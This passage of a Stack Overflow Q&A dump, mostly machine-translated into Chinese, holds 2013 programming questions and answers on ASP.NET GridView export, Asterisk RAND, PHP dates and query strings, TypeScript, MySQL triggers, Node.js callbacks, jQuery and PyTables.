            GridView.HeaderRow.Cells[2].Style.Add("background-color", "green");
            GridView.HeaderRow.Cells[3].Style.Add("background-color", "green");
            GridView.HeaderRow.Cells[4].Style.Add("background-color", "green");
            GridView.HeaderRow.Cells[5].Style.Add("background-color", "green");
            GridView.HeaderRow.Cells[6].Style.Add("background-color", "green");
            GridView.HeaderRow.Cells[7].Style.Add("background-color", "green");

            int k = GridView.Rows.Count;

            for (int i = 1; i < GridView.Rows.Count; i++)
            {

                GridViewRow row = GridView.Rows[i];

                //Change Color back to white

                row.BackColor = System.Drawing.Color.White;

                //Apply text style to each Row

                row.Attributes.Add("class", "textmode");

                //Apply style to Individual Cells of Alternating Row

                if (i % 2 != 0)
                {
                    row.Cells[0].Style.Add("background-color", "#C2D69B");
                    row.Cells[1].Style.Add("background-color", "#C2D69B");
                    row.Cells[2].Style.Add("background-color", "#C2D69B");
                    row.Cells[3].Style.Add("background-color", "#C2D69B");
                    row.Cells[4].Style.Add("background-color", "#C2D69B");
                    row.Cells[5].Style.Add("background-color", "#C2D69B");
                    row.Cells[6].Style.Add("background-color", "#C2D69B");
                    row.Cells[7].Style.Add("background-color", "#C2D69B");
                }
            }
            GridView.RenderControl(hw);

            // style to format numbers to string.

            string style = @"<style> .textmode { mso-number-format:\@; } </style>";

            Response.Write(style);
            Response.Output.Write(sw.ToString());
            Response.Flush();
            Response.End();
        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:12:19.793

您可以使用 asp:boundfield 选择要在 gridview 中显示的列。然后将该gridview导出到excel。

好的。在您的情况下，您可以绑定一个具有相同数据但没有编辑/删除列的新网格视图。您可以将此新网格视图的可见性设置为 false。

# eclipse - 在 Eclipse 中放松 NG

> ID：16013647
> 
> 赞同：4
> 
> 时间：2013-04-15T11:09:17.493
> 
> 标签：eclipse, relaxng

是否有任何免费软件插件为 Eclipse 添加了 RelaxNG 支持？我的意思是语法突出显示，在按下 Ctrl+Space 后显示提示等。

我只找到了一些关于这个主题的文章，它们已经有好几年了[截至 2013 年]。他们说 Webtools 中正在开发对 RelaxNG 的支持，但现在没有提到 RelaxNG。

那么是否有人对此有更多了解，或者知道其他一些将 RelaxNG 支持添加到 Eclipse 中的免费软件项目（实际工作）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T12:00:20.203

oXygen XML 编辑器（商业软件）有这样的支持——它可以作为一个 Eclipse 插件使用。

见：[http ://www.oxygenxml.com/](http://www.oxygenxml.com/)

# random - asterisk extensions.conf random number

> ID：16013648
> 
> 赞同：0
> 
> 时间：2013-04-15T11:09:18.230
> 
> 标签：random, asterisk

I want to generate a random number from 1 to 10 inside the extensions.conf with asterisk. Using the infamous rand(1,10) is just not working. I know I'm not using the proper language for extensions to understand so any kind of help I can get on this is greatly appreciated.

Here's what I have:

```
exten => 123456789,2,MeetMe(rand(1,10),qdM) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T14:52:37.170

```
pro-sip*CLI> core show function RAND 

  -= Info about function 'RAND' =- 

[Synopsis]
Choose a random number in a range.                       

[Description]
Choose a random number between <min> and <max>.  <min> defaults to '0', if
not specified, while <max> defaults  to 'RAND_MAX' (2147483647 on many
systems).
Example:  Set(junky=${RAND(1,8)}); Sets junky to a random number between
1 and 8, inclusive.

[Syntax]
RAND([min][,max])

[Arguments]
Not available

[See Also]
Not available 
```

So you can use it as:

```
exten=>123456789,1,Meetme(${RAND(1,10)},qdM) 
```

# iphone - 应用程序委托方向中的窗口不起作用

> ID：16013651
> 
> 赞同：0
> 
> 时间：2013-04-15T11:09:36.230
> 
> 标签：iphone, ipad, ios6

我在应用程序委托文件中添加了一个通知视图作为 toast 我添加为类代码，如下所示，

```
customView = [[[UIView alloc] initWithFrame:CGRectMake(0, 0, 200, 54)] autorelease];
[customView setBackgroundColor: UIColorFromRGB(0xda5340)];
UILabel *lb1=[[[UILabel alloc]initWithFrame:CGRectMake(10, 17, 180, 21)] autorelease];
lb1.text=@"Pet is out of boundary";
lb1.textAlignment = UITextAlignmentCenter;
lb1.textColor=[UIColor whiteColor];
lb1.backgroundColor = [UIColor clearColor];
[customView addSubview:lb1];
[self.window addSubview:customView];
[self.window showToast:customView duration:3.0 position:@"top" ]; 
```

我已将我的 ipad ipad 应用程序设置为横向，当我在 ipad 中尝试时，上述代码仅适用于 iphone，它的方向不正确，`customView`被视为垂直。我还添加了以下代码，

```
-(BOOL)shouldAutorotateToInterfaceOrientation:    (UIInterfaceOrientation)interfaceOrientation { 
return YES; 
 } 

-(NSUInteger)supportedInterfaceOrientations{ 
  return UIInterfaceOrientationMaskAll;  
 } 
```

如果我想添加任何其他代码，请帮我解决

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:55:05.657

方向的最简单初始设置是选择`summary`选项卡并选择方向，如下图所示，

![在此处输入图像描述](https://i.stack.imgur.com/Nih0O.png)

![在此处输入图像描述](https://i.stack.imgur.com/s3mDc.png)

# ios - iOS - 在应用程序中显示静态视图

> ID：16013654
> 
> 赞同：1
> 
> 时间：2013-04-15T11:09:43.220
> 
> 标签：ios, uiview, uiviewcontroller

我正在努力实现以下目标： ![在此处输入图像描述](https://i.stack.imgur.com/Olco8.png)

实现这一点的最佳方法是什么？静态视图也不会成为过渡/动画的一部分。这意味着当用户从 VC1 -> VC2 进入时，子视图应该在整个视图转换过程中显示相同的信息。

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:31:06.717

你能再澄清一下你的情况吗？如果您想在没有动画交换的情况下跨控制器保留静态部分，这似乎不太可能，因为在对象层次结构中，视图位于控制器内部，因此一次交换即可获得所有视图。

除非您真的需要 3 个控制器，否则我可以建议一种解决方法，即在一个 UIView 中堆叠三个可交换的子视图，然后在另一个中堆叠静态子视图。当您交换可交换视图时，只有那些会改变，而不是静态的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:42:48.197

我通过实现做了一个类似的静态子视图；

1- 包含静态子视图的 UIViewController 子类

2- 强制设置导航控制器的过渡动画为 NO

3-实现自己的过渡（通过将视图控制器的主视图向左或向右移动）

# curl - 在 Salesforce 上使用 UTF-8 编码，无需 BOM

> ID：16013657
> 
> 赞同：0
> 
> 时间：2013-04-15T11:09:45.983
> 
> 标签：curl, utf-8, salesforce

我正在使用 cURL 从 salesforce 导出一些列表，但它使用 UTF 导出，但我需要带有 BOM 的 UTF，

有什么方法可以用 BOM 导出？

# ios - iOS 硬件加密与自己的实现

> ID：16013658
> 
> 赞同：2
> 
> 时间：2013-04-15T11:09:46.110
> 
> 标签：ios, encryption, aes, nsdata

我正在开发一个存储 PDF 文件的应用程序。这些文件应安全存储，即加密。我还发现了一些使用 AES 加密/解密扩展 NSData 的库。但后来我读到，iOS 支持通过 AES 进行硬件加密。如果它们都提供 AES256 加密，那么 NSData 库真的有必要吗？

如果存在差异，哪种方式更安全？另外..如何激活硬件加密？或者这是适用于所有应用程序的全局设置？我猜设备解锁后文件会被解密？那么，如果有人破解了我的手机，他也可以访问解密的文件吗？但是，如果我自己进行加密并将解密与存储在钥匙串中的 SHA 哈希密码连接起来，文件可能仍然无法访问？

**编辑：**

我是不是弄错了，我的库（AQToolkit）只是内置硬件加密的某种 API，我基本上在谈论同样的事情？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T21:46:00.353

我衷心推荐[RNCryptor](https://github.com/rnapier/RNCryptor)，它使用 Apple 自己的 Security.framework，尽可能保证硬件加密/解密。在默认情况下（带有 10k 次 PBKDF2 迭代的 AES-256）非常容易使用。它本身不是加密库，而是开源 Common Crypto C 库的 Obj-C 封装。一探究竟。

# php - PHP日期函数问题

> ID：16013660
> 
> 赞同：2
> 
> 时间：2013-04-15T11:09:50.233
> 
> 标签：php

我需要以下列格式获取日期：

`Jan 21, 1990`

为此，我`date('M d, Y')`在*php.net*上使用过，但我得到了完整的时间字符串，包括 AM/PM 时间日期等。

```
<?php 
    echo date('DATE_FORMAT, strtotime($staff['Staff']['date_added'])'); 
?> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-15T11:15:37.707

这是你的答案

```
echo date("M d, Y", strtotime($staff['Staff']['date_added'])); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:14:17.733

**您可以将`date`功能与`strtotime`**

```
$today = '1990/01/21';
echo date('M d, Y', strtotime($today)) 
```

**输出将是**

```
Jan 21, 1990 
```

文档
[日期](http://php.net/manual/it/function.date.php)
[strtotime](http://php.net/manual/en/function.strtotime.php)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T11:18:48.110

不要将[日期](http://php.net/manual/en/function.date.php) 的两个参数合二为一

尝试这个

```
<?php 
 echo date('M d, Y', strtotime($staff['Staff']['date_added'])); 
?> 
```

# typescript - 检测对象是否在 TypeScript 中动态实现接口

> ID：16013667
> 
> 赞同：23
> 
> 时间：2013-04-15T11:10:24.343
> 
> 标签：typescript

有什么办法，如何检测某个**对象**是否实现了某个接口？

```
if(myObj implements IMyInterface) {
    //... do something
} 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-04-15T13:40:07.347

不。

目前，类型仅在开发和编译期间使用。类型信息不会以任何方式转换为已编译的 JavaScript 代码。

通过编译器生成一些代码，这是可能的。目前，TypeScript 团队正试图在最终的 JavaScript 中添加尽可能少的代码，例外是“extends”关键字，它为编译的输出添加了一个新方法。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2016-08-27T14:40:19.130

**是**的。现在你可以做到这一点，使用增强版的 TypeScript 编译器，让你知道哪个接口实现了应用程序的每个类。此版本的编译器将所有类型信息存储到运行时，并将这些信息链接到实际的构造函数。例如，您可以编写如下内容：

```
function implementsInterface(object: Object, target: Interface) {
    const objClass: Class = object.constructor && object.constructor.getClass();
    if (objClass && objClass.implements) { 
        let found = false;
        for (let base of objClass.implements) {
            let found = interfaceExtends(base, target);
            if (found) {
                return true;
            }
        }
    }
    return false;
}

// recursive interface inheritance check
function interfaceExtends(i: Interface, target: Interface) {
    if (i === target) { 
        return true;
    }
    if (i.extends) {
        let found = false;
        for (let base of i.extends) {
            // do a recursive check on base interface...
            found = interfaceExtends(base, target);
            if (found) {
                return true;
            }
        }
    }
    return false;
} 
```

[您可以在此处](https://github.com/pcan/reflec-ts-examples/tree/master/inheritance-check)找到适合您需求的完整工作示例

# html - 为什么 Vertical Align 正在使用 jsfiddle

> ID：16013671
> 
> 赞同：2
> 
> 时间：2013-04-15T11:10:35.920
> 
> 标签：html, css

相同的来源，没有区别，但垂直对齐仅适用于 jsfiddle。请帮我解答。这是 HTML 源代码，它不适用于 Chrome：

```
<html>
<head>
    <title>Demo</title>
    <style>
        .checkboxOfField
        {
            display: inline-block;
            width: 100%;
            background-color: red;
            height: 40px;
            line-height: 40px;
        }
    </style>
</head>
<body>
    <span class="checkboxOfField">
        <input style="text-align: center; vertical-align: middle" type="checkbox" />
    </span>
</body>
</html> 
```

这是 jsfiddle 链接： http: [//jsfiddle.net/UghzT/](http://jsfiddle.net/UghzT/) 它适用于 Chrome。谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-15T11:12:40.643

可能是因为 Quirksmode？

添加文档类型！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T12:31:55.067

为什么要将样式添加到`input`? 它什么也没做。有`input`一个`type="checkbox"`属性。因此`text-align:center;`有点奇怪，因为里面永远不会有文本。甚至`vertical-align`财产也不属于那里。复选框内没有任何东西可以对齐...

您将使用 CSS 代码来对齐中间跨度中的所有内容。检查[这个 jsFiddle](http://jsfiddle.net/UghzT/1/)。我删除了“样式”属性，它仍然很好用。

# mysql - MYSQL 插入后触发器以更改字段值

> ID：16013676
> 
> 赞同：0
> 
> 时间：2013-04-15T11:10:43.953
> 
> 标签：mysql, sql, triggers

我有两个表 stock 和 order ，我试图让触发器工作，以便在下订单后，订单数量会从库存数量字段中删除。

```
DELIMITER $$
CREATE TRIGGER stock_update 
AFTER INSERT ON order
FOR EACH ROW
BEGIN
SET @quantity = NEW.quantity 
UPDATE stock s;
SET s.quantity = OLD.quantity - NEW.quantity
FROM stock s, order o
WHERE s.ID_stock = o.ID_stock;
END;
$$
DELIMITER; 
```

但我只是收到错误号 1064

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:24:09.663

我不太确定它会起作用，因为我需要表定义才能对其进行测试。在每种情况下，您都应该删除该`FROM`子句以及最后一行`DELIMITER;`。您还应该`SET @quantity = NEW.quantity`用分号结束该行。

```
DELIMITER $$
CREATE TRIGGER stock_update 
AFTER INSERT ON order FOR EACH ROW
BEGIN
    UPDATE stock s;
     SET s.quantity = OLD.quantity - NEW.quantity
    WHERE s.ID_stock = NEW.ID_stock;
END;
$$ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:27:10.647

有几个问题：

1.  order 是保留字，因此您需要在其周围使用反引号
2.  你不需要使用变量@quantity
3.  更新语句错误
4.  分隔符和; 应该用空格隔开

尝试这个

```
DELIMITER $$
CREATE TRIGGER stock_update 
AFTER INSERT ON `order`
FOR EACH ROW
BEGIN
UPDATE stock s 
   SET s.quantity = s.quantity - NEW.quantity
 WHERE s.ID_stock = NEW.ID_stock;
END $$
DELIMITER ; 
```

# actionscript-3 - 如何从 Parsley/Flex 上下文中手动删除 UI 组件？

> ID：16013690
> 
> 赞同：1
> 
> 时间：2013-04-15T11:11:12.203
> 
> 标签：actionscript-3, apache-flex, parsley

如何从 Parsley 上下文中手动删除视图组件？可以说我有一个视图和主要应用程序。我已经完成了以下操作，但它不起作用 - 视图仍然在 Parsley 上下文中。

主要应用：

```
<s:Application> 
    <parsley:ContextBuilder config="ApplicationConfig"/>

    <view:SomeView id="someView"/>    

    <s:Button label="Enable View"
        click="enableViewHandler()"/> 

    <s:Button label="Disable View"
        click="disableViewHandler()"/>

    <fx:Script>    
        private function enableViewHandler():void {
            someView.dispatchEvent(new Event("configureView", true));
        }

        private function disableViewHandler():void {
            someView.dispatchEvent(new Event("removeView", true));
        }
    </fx:Script>
</s:Application> 
```

查看组件：

```
<s:VGroup>  
    <fx:Metadata>
        [Autoremove("false")]
    </fx:Metadata>
</s:VGroup> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-03T23:17:26.660

我找到的唯一解决方案是更改`enableViewHandler()`为`Configure.view(someView).autoremove(false).execute();`

# python - 如何使用 Selenium 库在 Robot Framework 中编写测试用例

> ID：16013692
> 
> 赞同：2
> 
> 时间：2013-04-15T11:11:13.573
> 
> 标签：python, selenium, automated-tests, jython, robotframework

我已经安装了机器人框架。我正在使用 Selenium 库搜索机器人框架的示例测试用例。

我需要一个指南来开始在 Robot Framework 上编写 TC。帮助表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-17T12:25:07.197

我找到了一个带有 Selenium2Library 的机器人框架 (RF) 的 Maven 项目。以下是运行的步骤：

先决条件：Java（1.5 或更高版本）、Maven

1.  从以下 URL 下载“robotframework-selenium2library-java-master.zip”：

    [https://github.com/MarkusBernhardt/robotframework-selenium2library-java](https://github.com/MarkusBernhardt/robotframework-selenium2library-java)

2.  解压文件夹

3.  打开控制台/命令提示符并转到步骤 2 中解压缩的文件夹
4.  执行maven命令为：mvn clean install
5.  观察执行：Google 页面会在 FF 中打开，并根据编写的测试用例执行
6.  观察 /target/robotframework-reports/report.html 上的报告（报告很好！！！）

[注：需要分析文件夹和编码基础设施。代码在 src 文件夹中。了解 pom.xml 很重要]

以下链接可能会很有帮助。入门部分有如何编写测试用例的分步说明。

[http://www.wallix.org/2011/07/26/how-to-use-robotframework-with-the-selenium-library/](http://www.wallix.org/2011/07/26/how-to-use-robotframework-with-the-selenium-library/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-16T22:02:49.703

从您的问题中不清楚您要达到的目标。你想从 Java 运行 Robot Framework 吗？您想在 Java 中定义关键字吗？

我怀疑您的目标是错误的工具。

首先，Robot Framework 测试是用类人语言编写的。短语由**关键字**定义，这些关键字可以使用内置语言实现为*用户关键字*，也可以使用 Python/Java 类实现为*外部关键字。*

其次，Robot Framework 是一个编写**验收测试**的工具。在此类测试中，您选择***整个系统***并用某些输入刺激它，并期望并验证某个输出/行为。

现在，重要的是**系统入口点**。如果您的系统入口点是可执行文件，那么测试过程是 Python 还是 Java 则无关紧要；因为所有测试要做的就是启动一个新程序。

如果您使用 Java 库与系统交互，则需要使用该库在 Java 中定义外部关键字。

如果您想从 Java 运行 Robot Framework（无需安装 Python）：

```
java -jar robotframework-2.6.3.jar --help
java -jar robotframework-2.6.3.jar mytests.txt
java -jar robotframework-2.6.3.jar --variable name:value mytests.txt 
```

您可以在此处找到 jar：[https ://code.google.com/p/robotframework/downloads/list](https://code.google.com/p/robotframework/downloads/list)

您需要先编写一些测试用例。我建议使用 RIDE ( [https://github.com/robotframework/RIDE](https://github.com/robotframework/RIDE) ) 作为测试编辑器，但您需要安装 Python 才能运行它。

# node.js - 为什么这个函数的返回值被忽略了？

> ID：16013696
> 
> 赞同：0
> 
> 时间：2013-04-15T11:11:22.487
> 
> 标签：node.js, asynchronous

我很确定这里的问题只是我还没有以必要的异步方式思考 Node.js。

我`userExists()`在一个模块`db`中有一个函数，它在传递电子邮件时检查用户是否在数据库中，并返回`true`or `false`。

相关部分：

```
userExists : function(email) {
    var client = new pg.Client(app.conString);
    var query;
    var result = false;

    client.connect();

    query = client.query(
        "SELECT * FROM users WHERE email = $1",
        [email]
    );

    query.on('row', function(row) {
        result = true;
    });

    query.on('end', function() {
        client.end();
        return result;
    }); 
```

我这样称呼它：

```
if (!db.userExists(req.session.email)) {
        newUser();
    } else {
        updateUser();
    }
} 
```

无论返回什么，它总是`newUser()`被调用。`userExists()`我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:17:14.697

你弄错时间了。函数运行后查询完成，因此您需要传递一个回调函数并“等待”结果。

```
userExists = function(email, cb) {
    var client = new pg.Client(app.conString);
    var query;
    var result = false;

    client.connect();

    query = client.query(
        "SELECT * FROM users WHERE email = $1",
        [email]
    );

    query.on('row', function(row) {
        result = true;
    });

    query.on('end', function() {
        client.end();
        cb(result);
    });
}

// Time 1: ask is the user exists
db.userExists(req.session.email, function(exists) {
    // Time 3: Yeah result came back
    if (exists) {
        updateUser()
    }
    else {
        newUser();
    }
});
// Time 2: I've asked, let's wait for the result
// The following code will likely be executed before you get the result back 
```

# android - 覆盖页眉和页脚发光

> ID：16013701
> 
> 赞同：0
> 
> 时间：2013-04-15T11:11:29.940
> 
> 标签：android, android-actionbar, actionbarsherlock

在使用 actionbarsherlock 时，是否有任何方法可以覆盖列表视图中的页眉和页脚发光以及自定义颜色/渐变？还是可以在不使用 actionbarsherlock 的情况下覆盖它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:24:21.267

据我所知，没有办法做到这一点。有关更多信息，请参见此处：

[https://groups.google.com/forum/?fromgroups=#!topic/android-developers/i5a3uNN8jpg](https://groups.google.com/forum/?fromgroups=#!topic/android-developers/i5a3uNN8jpg)

# php - 将查询字符串添加到随机 URL

> ID：16013703
> 
> 赞同：0
> 
> 时间：2013-04-15T11:11:31.337
> 
> 标签：php, query-string

我想向 URL 添加查询字符串，但是 URL 格式是不可预测的。网址可以是

*   `http://example.com/page/`->`http://example.com/page/?myquery=string`
*   `http://example.com/page`->`http://example.com/page?myquery=string`
*   `http://example.com?p=page`->`http://example.com?p=page&myquery=string`

这些是我正在考虑的 URL，但可能还有其他我不知道的格式。

我想知道是否有标准、库或通用方法可以做到这一点。我正在使用 PHP。

编辑：我正在使用[Cbroe](https://stackoverflow.com/a/16013948/12637)解释和[Passerby](https://stackoverflow.com/a/16014036/12637)代码。Hamza还有另一个[函数](https://stackoverflow.com/a/16014276/12637)，但我想最好使用 PHP 函数并且代码更简洁/更短。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T11:28:43.253

```
function addQuery($url,array $query)
{
    $cache=parse_url($url,PHP_URL_QUERY);
    if(empty($cache)) return $url."?".http_build_query($query);
    else return $url."&".http_build_query($query);
}

// test
$test=array("http://example.com/page/","http://example.com/page","http://example.com/?p=page");
print_r(array_map(function($v){
    return addQuery($v,array("myquery"=>"string"));
},$test)); 
```

[现场演示](http://3v4l.org/bGdXJ#v530)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:24:28.133

> 我想知道是否有标准、库或通用方法可以做到这一点。我正在使用 PHP。

取决于您希望它的故障安全程度（因此更复杂）。

最简单的方法是查找`?`URL 中是否有 a - 如果有，则 append `&myquery=string`，否则 append `?myquery=string`。这应该涵盖大多数符合标准的 URL 的情况。

如果你想让它更复杂，你可以使用[`parse_url`](http://php.net/manual/en/function.parse-url.php)then将 URL 分开，然后将带有值[`parse_str`](http://www.php.net/manual/en/function.parse-str.php)的键添加到第二个函数返回的数组中——然后将它们重新组合在一起，用于新的查询字符串部分。`myquery``string`[`http_build_query`](http://www.php.net/manual/en/function.http-build-query.php)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-15T11:41:58.893

一些意大利面条代码：

```
echo addToUrl('http://example.com/page/','myquery', 'string').'<br>';
echo addToUrl('http://example.com/page','myquery', 'string').'<br>';
echo addToUrl('http://example.com/page/wut/?aaa=2','myquery', 'string').'<br>';
echo addToUrl('http://example.com?p=page','myquery', 'string');

function addToUrl($url, $var, $val){
    $array = parse_url($url);
    if(isset($array['query'])){
        parse_str($array['query'], $values);
    }
    $values[$var] = $val;
    unset($array['query']);

    $options = '';$c = count($values) - 1;
    $i=0;
    foreach($values as $k => $v){
        if($i == $c){
            $options .= $k.'='.$v;
        }else{
            $options .= $k.'='.$v.'&';
        }
        $i++;
    }

    $return = $array['scheme'].'://'.$array['host'].(isset($array['path']) ? $array['path']: '') . '?' . $options;
    return $return;
} 
```

结果：

```
http://example.com/page/?myquery=string
http://example.com/page?myquery=string
http://example.com/page/wut/?aaa=2&myquery=string
http://example.com?p=page&myquery=string 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-15T11:24:58.233

你应该试试这个[`http_build_query()`](http://php.net/manual/en/function.http-build-query.php)功能，我认为这就是你想要的，也许还有一点`parse_str()`。

# javascript - jquery获取多个属性

> ID：16013706
> 
> 赞同：2
> 
> 时间：2013-04-15T11:11:36.347
> 
> 标签：javascript, jquery

有没有办法在jQuery中获取多个属性

```
 <input type="text" title="hello there" class="maiz"/>

(function() {
  var inputTitle = $("input").attr("title","class");
  console.log(inputTitle[1])//output:undefined
})(); 
```

我是 jQuery 新手

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T11:17:19.633

你不能得到多个属性，你只需要`attr`再次调用：

```
var input = $("input");
var title = input.attr("title");
var cls   = input.attr("class"); 
```

您的示例将值“class”设置为 title 属性。

或更类似于您的原始代码：

```
var inputTitle = [input.attr("title"), input.attr("class")];
inputTitle[1]; // gives you 'maiz' 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:19:27.173

你可以试试这个：

```
for (var i = 0; i < elem.attributes.length; i++) {
  var attrib = elem.attributes[i];
  if (attrib.specified == true) {
    console.log(attrib.name + " = " + attrib.value);
  }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T11:16:22.493

您可以使用元素对象上的 attributes 属性获取属性：

```
var el = document.getElementById("someId");
var attributes = el.attributes; // Here they are 
```

在 jQuery 中，您可以使用 get() 方法获取 Original 元素，例如：

```
var el = $("input").get(0);
var attributes = el.attributes; // Here they are 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-15T11:17:49.997

尝试这个：

```
$('.maiz').click(function(){
    for(var i = 0;i < this.attributes.length;i++){
        console.log(this.attributes[i]);
    }
}); 
```

[**演示**](http://jsfiddle.net/7fuVX/)

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2013-04-15T11:20:20.180

Jquery 选择器的工作方式与 CSS 选择器非常相似。 `$('selector')`如果要选择特定类的所有元素，如果 `$('.class')`要选择类和id `$('.class, #id')` ，基本上就是这样。除非您有具体问题

# python - Time64Col 上的 PyTables 内核内搜索

> ID：16013711
> 
> 赞同：0
> 
> 时间：2013-04-15T11:11:47.853
> 
> 标签：python, pytables

我正在使用 PyTables 2.4.0 和 Python 2.7 我有一个包含以下典型表的数据库：

```
/anc/asc_wind_speed (Table(87591,), shuffle, blosc(3)) 'Wind speed'
  description := {
  "value_seconds": Time64Col(shape=(), dflt=0.0, pos=0),
  "update_seconds": Time64Col(shape=(), dflt=0.0, pos=1),
  "status": UInt8Col(shape=(), dflt=0, pos=2),
  "value": Float64Col(shape=(), dflt=0.0, pos=3)}
  byteorder := 'little'
  chunkshape := (2621,)
  autoIndex := True
  colindexes := {
    "update_seconds": Index(9, full, shuffle, zlib(1)).is_CSI=True,
    "value": Index(9, full, shuffle, zlib(1)).is_CSI=True} 
```

我使用浮点秒填充时间戳列。

在我的 IPython 会话中数据看起来不错：

```
array([(1343779432.2160001, 1343779431.8529999, 0, 5.2975000000000003),
       (1343779433.2190001, 1343779432.9430001, 0, 5.7474999999999996),
       (1343779434.217, 1343779433.9809999, 0, 5.8600000000000003), ...,
       (1343866301.934, 1343866301.5139999, 0, 3.8424999999999998),
       (1343866302.934, 1343866302.5799999, 0, 4.0599999999999996),
       (1343866303.934, 1343866303.642, 0, 3.7825000000000002)], 

  dtype=[('value_seconds', '<f8'), ('update_seconds', '<f8'), ('status', '|u1'), ('value', '<f8')]) 
```

..但是当我尝试使用索引列'update_seconds'进行内核搜索时，一切都变成了梨形：

```
len(wstable.readWhere('(update_seconds <= 1343866303.642)'))
0 
```

即，当我期待所有 87591 行时，我得到了 0 行。有时我确实设法通过'> ='查询获得一些行，但时间戳列随后以巨大的浮点数（〜10 ^ 79）返回。似乎正在进行一些隐式类型转换，导致 Time64Col 值被误解。有人可以发现我的错误，还是我应该忘记 Time64Cols 并将它们全部转换为 Float64（我该怎么做？）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T19:38:27.320

这是因为 Time64 是一种特殊的 C 类型结构（参见 time.h）。暂时使用 Float64Col。请参阅以下问题：[https ://github.com/PyTables/PyTables/issues/230](https://github.com/PyTables/PyTables/issues/230)

# c# - 使用 LINQ (removeAll) 从列表中删除项目

> ID：16013713
> 
> 赞同：0
> 
> 时间：2013-04-15T11:11:55.720
> 
> 标签：c#, linq-to-entities

我有两个对象列表，我一直在学习如何从一个列表中删除项目，如果它们出现在另一个列表中。

我想出了这个：

```
result.ResultantPoliciesTable.RemoveAll(item => result.PoliciesTable.Select
(f => f.PolicyName).Contains(item.PolicyName)); 
```

`ResultantPoliciesTable`这可行，但是如果调用的对象的整数属性`ManagementID`等于我将提供的值，那么我不希望删除该对象。

谁能帮我扩展这个查询来实现这个？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T11:13:59.033

尝试以下操作：

```
int doNotRemoveID = 7862384732;
result.ResultantPoliciesTable.RemoveAll(
    item => item.ManagementID != doNotRemoveID && 
            result.PoliciesTable.Select(f => f.PolicyName).Contains(item.PolicyName)); 
```

该变量`item`将填充您的每条记录`ResultantPoliciesTable`，如果您的结果方法返回`true`，它将被删除。因此，添加检查以查看是否`item.ManagementID`需要排除应该足以满足您的需求。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:18:09.920

```
result.ResultantPoliciesTable
      .RemoveAll(item => 
                      result.PoliciesTable
                            .Where(i => i.ManagementID!=myId)
                            .Select(f => f.PolicyName)
                            .Contains(item.PolicyName)
                ); 
```

# php - 内置 PHP 函数将结构化数组序列化为隐藏字段

> ID：16013714
> 
> 赞同：0
> 
> 时间：2013-04-15T11:11:57.047
> 
> 标签：php, html

我正在寻找一个可以转换这个数组的函数：

```
array(1) {
  ["a"]=>
  array(2) {
    ["b"]=>
    int(1)
    ["c"]=>
    string(5) "hello"
  }
} 
```

变成类似的东西：

```
array(2) {
  ["a[b]"]=>
  int(1)
  ["a[c]"]=>
  string(5) "hello"
} 
```

即“序列化”结构化数组，以便我可以轻松地将其作为隐藏字段放入 HTML 表单中，当我从 中读取它时`$_POST`，我得到完全相同的结构！是否有任何PHP内置函数？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T11:42:52.520

你需要自己把它弄平。没有内置的单行函数可以做到这一点。

```
function flattenArr($arr, $key, &$result) {
    foreach ($arr as $k => $v) {
        if (is_array($v)) {
            flattenArr($v, $key . "[$k]", $result);
        } else {
            $result[$key . "[$k]"] = $v;
        }
    }
}

$obj = array("a" => array("b" => "c", "d" => array("1"=>array(1,2,3,5),"2", "3")));
$result = array();
flattenArr($obj, "", $result);
foreach ($result as $k => $v) {
    echo "result$k = $v\n";
} 
```

输出：

```
result[a][b] = c
result[a][d][1][0] = 1
result[a][d][1][1] = 2
result[a][d][1][2] = 3
result[a][d][1][3] = 5
result[a][d][2] = 2
result[a][d][3] = 3 
```

这可能不会像现在这样，您可能需要对其进行一些修改。高温高压

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-15T11:35:38.810

```
$arr = array(
        "a"=> array( "b"=>1, "c"=>"hello", "d"=> array( "e"=>3, "j"=>"wow") ),
        "z"  => array( "za"=>22, "tt"=>'wos')
    );

function loop_it($array, $arr=array(), $Mkey = false){
    foreach ($array as $key => $value) {
        $_key = $Mkey ? $Mkey . "[" . $key . "]" : $key;
        if(is_array($value)){
            $arr += loop_it($value, $arr, $_key);
        } else{
            $arr[$_key] = $value;
        }
    }
    return $arr;
}

$return = loop_it($arr);    
var_dump($return); 
```

这是工作功能..:)

